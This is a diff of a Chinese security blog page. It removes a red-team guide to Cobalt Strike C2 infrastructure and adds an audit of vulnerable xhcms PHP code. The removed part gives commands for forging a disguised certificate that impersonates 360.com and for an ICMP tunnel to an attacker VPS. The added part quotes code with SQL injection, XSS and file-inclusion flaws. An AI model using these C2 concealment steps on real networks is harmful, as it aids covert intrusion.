@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>c2基建 | Alice01</title>
+    <title>xhcms审计复现 | Alice01</title>
     <meta name="author" content="Alice01" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -114,14 +114,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>c2基建</h1>
+        <h1>xhcms审计复现</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/6/19
+            2025/8/12
         </span>
         
         
@@ -133,8 +133,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E7%BA%A2%E9%98%9F%E5%9F%BA%E5%BB%BA/" style="color: #00bcd4">
-                    红队基建
+                <a href="/tags/%E5%AE%A1%E8%AE%A1/" style="color: #00bcd4">
+                    审计
                 </a>
             </span>
             
@@ -143,56 +143,20 @@
     </div>
     
     <div class="content" v-pre>
-        <h2 id="1-Linxu上线"><a href="#1-Linxu上线" class="headerlink" title="1.Linxu上线"></a>1.Linxu上线</h2><p>genCrossC2.xxx 上传到服务端并chmod权限<br>cna中修改第一个路径为绝对路径</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/1.jpg" alt="1">加载crossc2插件</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/2.jpg" alt="2">将服务端 .cobaltstrike.beacon_keys下载至客户端cs目录下（默认隐藏，需解除)</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/3.jpg" alt="3">crossc2仅支持https监听<img src="/images/c2%E5%9F%BA%E5%BB%BA/4.jpg" alt="4"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/5.jpg" alt="5"><img src="/images/c2%E5%9F%BA%E5%BB%BA/6.jpg" alt="6">客户端生成linuxpayload</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/7.jpg" alt="7"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/8.jpg" alt="8"></p>
-<p>上线</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/9.jpg" alt="9"></p>
-<h2 id="2-cs-msf派生"><a href="#2-cs-msf派生" class="headerlink" title="2.cs-msf派生"></a>2.cs-msf派生</h2><p><img src="/images/c2%E5%9F%BA%E5%BB%BA/10.jpg" alt="10"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/11.jpg" alt="11"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/13.jpg" alt="12"></p>
-<h2 id="3-C2隐匿"><a href="#3-C2隐匿" class="headerlink" title="3.C2隐匿"></a>3.C2隐匿</h2><span id="more"></span>
+        <h2 id="1-index-php-file存在文件包含，addslash无法防文件包含"><a href="#1-index-php-file存在文件包含，addslash无法防文件包含" class="headerlink" title="1.index.php(file存在文件包含，addslash无法防文件包含)"></a>1.index.php(file存在文件包含，addslash无法防文件包含)</h2><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>addslash(单双引号反斜杠NULL前加\)</p>
+<h4 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h4><p><strong>$file</strong>&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br><strong>$action&#x3D;$file</strong>&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘<strong>.$action.</strong>‘.php’); &#x2F;&#x2F;载入相应文件</p>
+<span id="more"></span>
 
-<h4 id="3-1修改默认端口"><a href="#3-1修改默认端口" class="headerlink" title="3.1修改默认端口"></a>3.1修改默认端口<img src="/images/c2%E5%9F%BA%E5%BB%BA/14.jpg" alt="14"><img src="/images/c2%E5%9F%BA%E5%BB%BA/15.jpg" alt="15"></h4><h4 id="3-2证书隐藏"><a href="#3-2证书隐藏" class="headerlink" title="3.2证书隐藏"></a>3.2证书隐藏</h4><p>先查看cs证书<br> keytool -list -v -keystore cobaltstrike.store<br>发现包含多条cs名称<img src="/images/c2%E5%9F%BA%E5%BB%BA/16.jpg" alt="16"></p>
-<p>生成伪装的新cs证书并查看特特征<br>keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname “CN&#x3D;US, OU&#x3D;360.com, O&#x3D;Sofaware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN”</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/17.jpg" alt="17">替换旧证书<img src="/images/c2%E5%9F%BA%E5%BB%BA/18.jpg" alt="18"></p>
-<h4 id="3-3cs-profile"><a href="#3-3cs-profile" class="headerlink" title="3.3cs_profile"></a>3.3cs_profile</h4><p>profile编写<img src="/images/c2%E5%9F%BA%E5%BB%BA/19.jpg" alt="19"></p>
-<p>profile使用</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/20.jpg" alt="20"></p>
-<h4 id="3-4http跳板机重定向"><a href="#3-4http跳板机重定向" class="headerlink" title="3.4http跳板机重定向"></a>3.4http跳板机重定向</h4><p><img src="/images/c2%E5%9F%BA%E5%BB%BA/21.jpg" alt="21"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/22.jpg" alt="22"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/23.jpg" alt="23"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/24.jpg" alt="24"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/25.jpg" alt="25"></p>
-<h2 id="4-端口转发"><a href="#4-端口转发" class="headerlink" title="4.端口转发"></a>4.端口转发</h2><p>配置好frp服务端和客户端,将客户端端口代理到服务端</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/26.jpg" alt="26"></p>
-<p>通过代理端ip能访问到客户端服务</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/27.jpg" alt="27"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/28.jpg" alt="28"></p>
-<h2 id="5-隧道上线"><a href="#5-隧道上线" class="headerlink" title="5.隧道上线"></a>5.隧道上线</h2><h4 id="5-1ICMP上线"><a href="#5-1ICMP上线" class="headerlink" title="5.1ICMP上线"></a>5.1ICMP上线</h4><p>开两个监听，一个vps一个127</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/29.jpg" alt="29"></p>
-<p>VPS开服务</p>
-<p>sudo .&#x2F;pingtunnel -type server -noprint 1 -nolog 1</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/30.jpg" alt="30"></p>
-<p>客户端转发流量</p>
-<p>pingtunnel.exe -type client -l :9999 -s VPSIP -t VPSIP:PORT -tcp 1 -noprint 1 -nolog 1</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/31.jpg" alt="31"></p>
-<p>ICMP上线</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/32.jpg" alt="32"></p>
-<h4 id="5-2DNS上线"><a href="#5-2DNS上线" class="headerlink" title="5.2DNS上线"></a>5.2DNS上线</h4><p>买个域名备案</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/33.jpg" alt="33"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/34.jpg" alt="34"></p>
-<p>释放DNS端口</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/35.jpg" alt="35"></p>
-<p>ns记录后生成payload</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/36.jpg" alt="36"></p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/37.jpg" alt="37"></p>
-<p>上线</p>
-<p><img src="/images/c2%E5%9F%BA%E5%BB%BA/38.jpg" alt="38"></p>
+<h2 id="2-inc-checklogin-php-cookie伪造登录"><a href="#2-inc-checklogin-php-cookie伪造登录" class="headerlink" title="2.inc&#x2F;checklogin.php(cookie伪造登录)"></a>2.inc&#x2F;checklogin.php(cookie伪造登录)</h2><h4 id="语句-1"><a href="#语句-1" class="headerlink" title="语句"></a>语句</h4><p>&lt;?php<br>$user&#x3D;$_COOKIE[‘user’];<br>if ($user&#x3D;&#x3D;””){<br>header(“Location: ?r&#x3D;login”);<br>exit;	<br>}<br>?&gt;</p>
+<h2 id="3-admin-files-wzlist-php-csrf-文章删除"><a href="#3-admin-files-wzlist-php-csrf-文章删除" class="headerlink" title="3.admin&#x2F;files&#x2F;wzlist.php(csrf-文章删除)"></a>3.admin&#x2F;files&#x2F;wzlist.php(csrf-文章删除)</h2><h4 id="语句-2"><a href="#语句-2" class="headerlink" title="语句"></a>语句</h4><p><strong>$delete&#x3D;$_GET[‘delete’];</strong><br>if ($delete&lt;&gt;””){<br>$query &#x3D; “DELETE FROM content <strong>WHERE id&#x3D;’$delete’”</strong>;</p>
+<h2 id="4-admin-files-editlink-php-id参数sql注入"><a href="#4-admin-files-editlink-php-id参数sql注入" class="headerlink" title="4.admin&#x2F;files&#x2F;editlink.php(id参数sql注入)"></a>4.admin&#x2F;files&#x2F;editlink.php(id参数sql注入)</h2><h4 id="语句-3"><a href="#语句-3" class="headerlink" title="语句"></a>语句</h4><p><strong>$id&#x3D;$_GET[‘id’];</strong><br>$type&#x3D;$_GET[‘type’];<br>if ($type&#x3D;&#x3D;1){<br>$query &#x3D; “SELECT * FROM nav <strong>WHERE id&#x3D;’$id’”;</strong></p>
+<h2 id="5-files-download-php-id参数sql注入"><a href="#5-files-download-php-id参数sql注入" class="headerlink" title="5.files&#x2F;download.php(id参数sql注入)"></a>5.files&#x2F;download.php(id参数sql注入)</h2><h4 id="语句-4"><a href="#语句-4" class="headerlink" title="语句"></a>语句</h4><p>$query &#x3D; “SELECT * FROM nav <strong>WHERE link&#x3D;’$llink’”</strong>;</p>
+<h2 id="6-admin-files-login-php-user参数存在sql注入"><a href="#6-admin-files-login-php-user参数存在sql注入" class="headerlink" title="6.admin&#x2F;files&#x2F;login.php(user参数存在sql注入)"></a>6.admin&#x2F;files&#x2F;login.php(user参数存在sql注入)</h2><h4 id="语句-5"><a href="#语句-5" class="headerlink" title="语句"></a>语句</h4><p><strong>$user&#x3D;$_POST[‘user’];</strong><br>$query &#x3D; “SELECT * FROM manage <strong>WHERE user&#x3D;’$user’”</strong>;</p>
+<h2 id="7-file-contact-php-xss"><a href="#7-file-contact-php-xss" class="headerlink" title="7. file&#x2F;contact.php(xss)"></a>7. file&#x2F;contact.php(xss)</h2><h4 id="语句-6"><a href="#语句-6" class="headerlink" title="语句"></a>语句</h4><p>$page&#x3D;<strong>addslashes(</strong>$_GET[‘page’]);    </p>
+<p>&lt;?php **echo $page**?&gt; </p>
+<h2 id="8-files-contents-php-多个xss"><a href="#8-files-contents-php-多个xss" class="headerlink" title="8.files&#x2F;contents.php(多个xss)"></a>8.files&#x2F;contents.php(多个xss)</h2><h4 id="语句-7"><a href="#语句-7" class="headerlink" title="语句"></a>语句</h4><p>&lt;li&gt;<span>昵称</span>&lt;input name&#x3D;”name” type&#x3D;”text” value&#x3D;”&lt;?php **echo $_COOKIE[‘name’]**?&gt;” &#x2F;&gt;&lt;&#x2F;li&gt;<br>&lt;li&gt;<span>邮箱</span>&lt;input name&#x3D;”mail” type&#x3D;”text” value&#x3D;”&lt;?php **echo $_COOKIE[‘mail’]**?&gt;”&#x2F;&gt;&lt;&#x2F;li&gt;<br>&lt;li&gt;<span>网址</span>&lt;input name&#x3D;”url” type&#x3D;”text” value&#x3D;”&lt;?php **echo $_COOKIE[‘url’]**?&gt;”&#x2F;&gt;&lt;&#x2F;li&gt;</p>
+<h2 id="9-admin-files-commentlist-php-title参数xss"><a href="#9-admin-files-commentlist-php-title参数xss" class="headerlink" title="9.admin&#x2F;files&#x2F;commentlist.php(title参数xss)"></a>9.admin&#x2F;files&#x2F;commentlist.php(title参数xss)</h2><h4 id="语句-8"><a href="#语句-8" class="headerlink" title="语句"></a>语句</h4><p>$fl_id&#x3D;$list[‘cid’];<br>$query1 &#x3D; “SELECT * FROM $biao WHERE id&#x3D;’$fl_id’”;<br>$resul1 &#x3D; mysql_query($query1) or die(‘SQL语句有误：’.mysql_error());<br><strong>$contentname</strong> &#x3D; mysql_fetch_array($resul1); </p>
+<p>&lt;td&gt;&lt;?php **echo $contentname [‘title’]**;?&gt;&lt;&#x2F;td&gt;</p>
 
     </div>
     
